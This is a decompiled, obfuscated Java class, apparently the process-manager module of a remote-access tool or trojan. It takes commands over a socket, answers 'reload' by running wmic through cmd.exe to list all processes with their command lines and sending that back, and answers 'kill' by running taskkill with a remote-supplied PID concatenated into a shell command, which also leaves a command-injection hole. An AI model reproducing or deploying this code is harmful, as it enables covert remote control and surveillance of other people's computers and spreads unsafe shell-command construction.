package carLambo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;

public final class ProcessManager {
   private Socket sdfsldf;
   private OutputStream sabretb;
   private boolean dfhttegd = true;
   private InputStream bsgshsbs;

   // $FF: synthetic method
   private void sabretb() {
      while(true) {
         try {
            if (this.dfhttegd) {
               ProcessManager var1 = this;
               byte[] var2 = new byte[1];
               StringBuilder var4 = new StringBuilder();

               do {
                  int var3;
                  if ((var3 = var1.bsgshsbs.read(var2, 0, 1)) == -1) {
                     throw new RuntimeException();
                  }

                  var4.append(new String(var2, 0, var3));
               } while(!var4.toString().endsWith("\r\n\r\n"));

               String var7 = var4.toString();
               String[] var6;
               if ((var6 = this.sdfsldf(Integer.parseInt(var7.substring(0, var7.indexOf("\r\n\r\n")))).split("\\|"))[0].equals("reload")) {
                  this.sdfsldf(sdfsldf());
                  continue;
               }

               if (var6[0].equals("kill")) {
                  Runtime.getRuntime().exec((new StringBuilder()).insert(0, "cmd.exe /c taskkill /F /PID ").append(var6[1]).append(" /T").toString());
                  this.sdfsldf("showdialog|Process Terminated Successfully");
               }
               continue;
            }
         } catch (Exception var5) {
            this.dfhttegd = false;
         }

         return;
      }
   }

   // $FF: synthetic method
   private void sdfsldf(String var1) {
      String var2 = String.valueOf(var1.getBytes().length + "\r\n\r\n");
      try {
         this.sabretb.write(var2.getBytes());
         this.sabretb.write(var1.getBytes());
         this.sabretb.flush();
      } catch (Exception var4) {
         throw new RuntimeException(var4);
      }
   }

   // $FF: synthetic method
   private int dfhttegd() {
      byte[] var1 = new byte[1];
      StringBuilder var3 = new StringBuilder();

      int var2;
      try {
         while((var2 = this.bsgshsbs.read(var1, 0, 1)) != -1) {
            var3.append(new String(var1, 0, var2));
            if (var3.toString().endsWith("\r\n\r\n")) {
               String var4 = var3.toString();
               return Integer.parseInt(var4.substring(0, var4.indexOf("\r\n\r\n")));
            }
         }
      } catch (Exception e) {
         throw new RuntimeException(e);
      }


      throw new RuntimeException();
   }

   public static String sdfsldf() {
      String var0 = "";

      try {
         ProcessBuilder var1;
         (var1 = new ProcessBuilder(new String[]{"cmd.exe", "/c", "wmic /node:. /namespace:'\\\\root\\cimv2' path win32_process get name,processid,commandline /format:list"})).redirectErrorStream(true);
         StringBuilder var2 = new StringBuilder();

         try {
            Process var4 = var1.start();
            BufferedReader var12 = new BufferedReader(new InputStreamReader(var4.getInputStream()));

            String var3;
            while((var3 = var12.readLine()) != null) {
               if (!var3.equals("")) {
                  var2.append(var3 + "\r\n");
               }
            }
         } catch (IOException var10) {
            var10.printStackTrace();
         }

         String[] var16 = var2.toString().split("\r\n");
         int var13 = 0;
         String var14 = "";
         String[] var15 = var16;
         int var17 = var16.length;

         for(int var5 = 0; var5 < var17; ++var5) {
            String var6 = var15[var5];
            if (var13 == 3) {
               var13 = 0;
               var0 = (new StringBuilder()).insert(0, var0).append(var14).append("|").toString();
               var14 = "";
            }

            String var10000;
            label57: {
               if (var6.toLowerCase().contains("commandline")) {
                  label85: {
                     ++var13;

                     try {
                        var14 = (new StringBuilder()).insert(0, var14).append(var6.split("=")[1]).toString();
                     } catch (Exception var8) {
                        break label85;
                     }

                     var10000 = var6;
                     break label57;
                  }
               }

               var10000 = var6;
            }

            label66: {
               if (var10000.toLowerCase().contains("processid")) {
                  label86: {
                     ++var13;

                     try {
                        var14 = (new StringBuilder()).insert(0, var6.split("=")[1]).append("^").append(var14).toString();
                     } catch (Exception var9) {
                        var14 = (new StringBuilder()).insert(0, "^").append(var14).toString();
                        break label86;
                     }

                     var10000 = var6;
                     break label66;
                  }
               }

               var10000 = var6;
            }

            if (var10000.toLowerCase().contains("name")) {
               ++var13;

               try {
                  var14 = (new StringBuilder()).insert(0, var6.split("=")[1]).append("^").append(var14).toString();
               } catch (Exception var7) {
                  var14 = (new StringBuilder()).insert(0, "^").append(var14).toString();
               }
            }
         }
      } catch (Exception var11) {
         ;
      }

      return var0;
   }

   // $FF: synthetic method
   static void listener(ProcessManager var0) {
      var0 = var0;

      try {
         while(var0.dfhttegd) {
            ProcessManager var1 = var0;
            byte[] var2 = new byte[1];
            StringBuilder var4 = new StringBuilder();

            do {
               int var3;
               if ((var3 = var1.bsgshsbs.read(var2, 0, 1)) == -1) {
                  throw new RuntimeException();
               }

               var4.append(new String(var2, 0, var3));
            } while(!var4.toString().endsWith("\r\n\r\n"));

            String var7 = var4.toString();
            String[] var6;
            if ((var6 = var0.sdfsldf(Integer.parseInt(var7.substring(0, var7.indexOf("\r\n\r\n")))).split("\\|"))[0].equals("reload")) {
               var0.sdfsldf(sdfsldf());
            } else if (var6[0].equals("kill")) {
               Runtime.getRuntime().exec((new StringBuilder()).insert(0, "cmd.exe /c taskkill /F /PID ").append(var6[1]).append(" /T").toString());
               var0.sdfsldf("showdialog|Process Terminated Successfully");
            }
         }
      } catch (Exception var5) {
         var0.dfhttegd = false;
      }

   }

   ProcessManager(Socket var1) {
      try {
         this.bsgshsbs = var1.getInputStream();
         this.sabretb = var1.getOutputStream();
         (new Thread(new ProcessThread(this))).start();
      } catch (Exception var2) {
         this.dfhttegd = false;
      }
   }

   // $FF: synthetic method
   private String sdfsldf(int var1) {
      byte[] var2 = new byte[var1];
      StringBuilder var4 = new StringBuilder();
      int var5 = 0;
      int var3 = var1;

      for(int var10000 = 0; var10000 != var1; var10000 = var5) {
         try {
            var3 = this.bsgshsbs.read(var2, 0, var3);
         } catch (IOException e) {
            e.printStackTrace();
         }
         var5 += var3;
         if (var3 == -1) {
            throw new RuntimeException();
         }

         var4.append(new String(var2, 0, var3));
         var3 = var1 - var5;
      }

      return var4.toString();
   }
}
